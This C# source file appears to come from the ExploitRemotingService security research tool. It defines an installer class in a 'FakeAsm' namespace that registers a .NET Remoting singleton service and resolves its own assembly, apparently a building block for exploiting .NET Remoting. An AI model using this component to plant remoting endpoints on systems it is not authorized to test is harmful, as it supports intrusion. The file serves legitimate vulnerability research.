//    ExploitRemotingService
//    Copyright (C) 2014 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Runtime.Remoting;
using System.Runtime.Serialization;

namespace FakeAsm
{
    [RunInstaller(true)]
    public class InstallClass : Installer
    {
        public static void RegisterService(string name)
        {            
            RemotingConfiguration.RegisterWellKnownServiceType(
                    typeof(RemoteClass),
                    name,
                    WellKnownObjectMode.Singleton);

            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        }

        public override void Install(System.Collections.IDictionary stateSaver)
        {
            RegisterService(Context.Parameters["name"]);
        }

        static System.Reflection.Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            if (args.Name == typeof(InstallClass).Assembly.FullName)
            {
                return typeof(InstallClass).Assembly;
            }

            return null;
        }
    }
}
